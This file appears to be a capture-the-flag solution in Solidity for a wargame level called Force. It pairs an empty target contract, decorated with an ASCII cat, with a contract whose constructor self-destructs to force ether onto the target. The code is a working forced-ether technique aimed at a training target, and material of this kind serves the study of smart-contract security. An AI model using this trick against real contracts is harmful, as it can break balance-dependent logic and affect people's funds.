// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Force {/*

                   MEOW ?
         /\_/\   /
    ____/ o o \
  /~____  =ø= /
 (______)__m_m)

*/}

contract ForceSolution {
    constructor(address _challengeAddress) public payable {
        selfdestruct(payable(_challengeAddress));
    }
}
